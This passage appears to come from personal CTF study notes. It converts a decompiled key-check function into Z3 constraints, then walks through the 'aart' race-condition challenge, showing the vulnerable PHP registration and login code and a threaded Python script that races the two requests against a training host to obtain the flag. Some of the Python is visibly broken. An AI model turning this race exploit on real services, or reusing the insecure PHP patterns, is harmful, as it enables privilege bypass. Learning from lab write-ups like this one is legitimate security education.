+<pre class="language-c"><code v-pre class="language-c">undefined8 check_01(char *key)
+
+{
+  undefined8 auth;
+  
+  if ((((key[5] == '-') &amp;&amp; (key[11] == '-')) &amp;&amp; (key[17] == '-')) &amp;&amp; (key[23] == '-')) {
+    auth = 1;
+  }
+  else {
+    auth = 0;
+  }
+  return auth;
+}</code></pre>
+</doc-codeblock></div>
+<p>To:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-python"><code v-pre class="language-python">def check01(key):  
+    return If(
+        And(
+            And(
+                And(
+                  (Extract(5, 5, key) == '-'), (Extract(11, 11, key) == '-')
+                ), 
+            (Extract(17, 17, key) == '-')
+            ),
+        (Extract(23, 23, key) == '-')
+        ),
+    1, 0
+)</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="race-condition">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#race-condition">#</doc-anchor-trigger>
+        <span>Race condition</span>
+    </h1>
+</doc-anchor-target>
+<doc-anchor-target id="aart">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#aart">#</doc-anchor-trigger>
+        <span>aart</span>
+    </h2>
+</doc-anchor-target>
+<p><strong>Goal</strong>: register a user and login before that the restriction gets activated. This is the point of the <strong>race condition</strong>: we need to make the login happen before the registration is actually complete. More specifically, this is from <code v-pre>register.php</code>:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-php"><code v-pre class="language-php">if(isset($_POST['username'])){
+	$username = mysqli_real_escape_string($conn, $_POST['username']);
+	$password = mysqli_real_escape_string($conn, $_POST['password']);
+
+	$sql = &quot;INSERT into users (username, password) values ('$username', '$password');&quot;;
+
+	mysqli_query($conn, $sql);
+	$sql = &quot;INSERT into privs (userid, isRestricted) values ((select users.id from users where username='$username'), TRUE);&quot;;
+	mysqli_query($conn, $sql);
+	?&gt;
+	&lt;h2&gt;SUCCESS!&lt;/h2&gt;
+	&lt;?php
+}</code></pre>
+</doc-codeblock></div>
+<p>And this is from <code v-pre>login.php</code>:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-php"><code v-pre class="language-php">if($_POST['username'] === $row['username'] and $_POST['password'] === $row['password']){
+		?&gt;
+		&lt;h1&gt;Logged in as &lt;?php echo($username);?&gt;&lt;/h1&gt;
+		&lt;?php
+
+		$uid = $row['id'];
+		$sql = &quot;SELECT isRestricted from privs where userid='$uid' and isRestricted=TRUE;&quot;;
+		$result = mysqli_query($conn, $sql);
+		$row = $result-&gt;fetch_assoc();
+		if($row['isRestricted']){
+			?&gt;
+			&lt;h2&gt;This is a restricted account&lt;/h2&gt;
+
+			&lt;?php
+		}else{
+			?&gt;
+			&lt;h2&gt;&lt;?php include('../key');?&gt;&lt;/h2&gt;
+			&lt;?php
+
+		}
+	?&gt;
+	&lt;h2&gt;SUCCESS!&lt;/h2&gt;
+	&lt;?php
+	}</code></pre>
+</doc-codeblock></div>
+<p>And we need to make registration and login happen at the same time in order to be able to login before that <code v-pre>INSERT into privs (userid, isRestricted) values ((select users.id from users where username='$username'), TRUE);</code> gets executed.</p>
+<doc-anchor-target id="toolkit">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#toolkit">#</doc-anchor-trigger>
+        <span>Toolkit</span>
+    </h3>
+</doc-anchor-target>
+<p>Best python library for handling HTTP requests, hands down. We&#x27;ll use it for this challenge, since both the login and registration functions are POST requests. To look at requests we could use chrome developer tools or wireshark since HTTP requests are in clear.</p>
+<doc-anchor-target id="approach">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#approach">#</doc-anchor-trigger>
+        <span>Approach</span>
+    </h3>
+</doc-anchor-target>
+<p>First approach: we can try making the registration and the login happen at the same time. This will not work:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-python"><code v-pre class="language-python">import requests
+def registration(user, password):
+  url = &quot;%s/register.php&quot; % HOST
+  r = requests.post(url, data={'username': user, 'password': password})
+  if '&quot;SUCCESS!&quot; &quot;SUCCESS!&quot; in r.text:
+      return True
+  return False 
+
+def login(user, password):
+  url = &quot;%s/login.php&quot; % HOST
+  r = requests.post(url, data={'username': user, 'password': password}) 
+  print(r.text) 
+
+registration('qweqwe','qweqwe')
+login('qweqwe','qweqwe') </code></pre>
+</doc-codeblock></div>
+<p>Since the login is not fast enough. We need a multi-threading library.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-python"><code v-pre class="language-python">import threading, requests
+HOST = &quot;http://aart.training.jinblack.it&quot; 
+def randomString(N):
+  return ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase + string.digits, k=N)) 
+
+def registration(user, password):
+  url = &quot;%s/register.php&quot; % HOST
+  r = requests.post(url, data={'username': user, 'password': password})
+  if &quot;SUCCESS!&quot; in r.text:
+    return True
+  return False 
+
+def login(user, password):
+  url = &quot;%s/login.php&quot; % HOST
+    r = requests.post(url, data={'username': user, 'password': password})
+  print(r.text) 
+
+  while True:
+    username = randomString(10)
+    password = randomString(10)
+    r = threading.Thread(target=registration, args=(username, password))
+    l = threading.Thread(target=login, args=(username, password))
+    r.start()
+    l.start() </code></pre>
+</doc-codeblock></div>
+<p>The code above actually prints the flag.</p>
+<p><strong>Note</strong>: we need a new username for each attempt, which means that a random string generator as username would be a good choice to make the exploitation simpler.</p>
+
+                                
+                                <!-- Required only on API pages -->
+                                <doc-toolbar-member-filter-no-results />
+                            </div>
+                            <footer class="clear-both">
+                            
+                                <nav class="flex mt-14">
+                                    <div class="w-1/2">
+                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../01-shellcode/">
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+                                            <span>
+                                                <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
+                                                <span class="block mt-1">Shellcode</span>
+                                            </span>
+                                        </a>
+                                    </div>
+                            
+                                    <div class="w-1/2">
+                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../07-xss/">
+                                            <span>
+                                                <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
+                                                <span class="block mt-1">XSS</span>
+                                            </span>
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+                                        </a>
+                                    </div>
+                                </nav>
+                            </footer>
+                        </main>
+                
+                        <div class="border-t dark:border-dark-650 pt-6 mb-8">
+                            <footer class="flex flex-wrap items-center justify-between">
+                                <div>
+                                    <ul class="flex flex-wrap items-center text-sm">
+                                    </ul>
+                                </div>
+                                <div class="docs-copyright py-2 text-gray-500 dark:text-dark-350 text-sm leading-relaxed"><p>Check out my GitHub profile for other notes: <a href="https://github.com/francesco-plt">https://github.com/francesco-plt</a></p></div>
+                            </footer>
+                        </div>
+                    </div>
+                
+                    <!-- Rendered if sidebar right is enabled -->
+                    <!-- Sidebar right skeleton-->
+                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-white border-gray-200 lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton dark:bg-dark-850 dark:border-dark-650">
+                        <div class="pl-5">
+                            <div class="w-32 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                            <div class="w-48 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                            <div class="w-40 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                        </div>
+                    </div>
+                
+                    <!-- User should be able to hide sidebar right -->
+                    <doc-sidebar-right v-cloak></doc-sidebar-right>
+                </div>
+
+            </div>
+        </div>
+    
+        <doc-search-mobile></doc-search-mobile>
+        <doc-back-to-top></doc-back-to-top>
+    </div>
+
+
+    <div id="docs-overlay-target"></div>
+
+    <script>window.__DOCS__ = { "title": "Symbolic", level: 1, icon: "file", hasPrism: true, hasMermaid: false, hasMath: true }</script>
+</body>
+</html>
